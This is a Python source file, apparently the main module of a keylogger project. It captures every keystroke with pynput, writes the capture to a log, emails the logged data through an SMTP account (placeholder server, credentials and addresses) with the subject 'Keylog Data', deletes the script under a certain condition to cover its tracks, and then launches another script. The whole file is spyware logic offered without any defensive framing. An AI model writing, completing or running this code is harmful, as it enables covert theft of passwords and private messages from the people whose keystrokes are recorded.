from core.keylogger import KeyLogger
from core.file_handler import write_log, read_log
from services.email_service import send_email
from utils.system_utils import delete_script, run_main_script

def check_for_target_access():
    content = read_log()
    if "logger.py" in content:
        delete_script()

def execute():
    logger = KeyLogger()

    print("Key logging started... Press ESC to stop.")

    def stop_listener(key):
        from pynput import keyboard
        if key == keyboard.Key.esc:
            data = logger.get_data()
            write_log(data)

            check_for_target_access()

            # EMAIL CONFIG (placeholder)
            smtp_config = {
                "server": "SMTP SERVER",
                "port": 587,
                "username": "USERNAME",
                "password": "PASSWORD"
            }

            send_email(
                "SENDER",
                "RECEIVER",
                "Keylog Data",
                data,
                smtp_config
            )

            run_main_script()
            return False

    from pynput import keyboard
    with keyboard.Listener(
        on_press=logger.on_press,
        on_release=stop_listener
    ) as listener:
        listener.join()
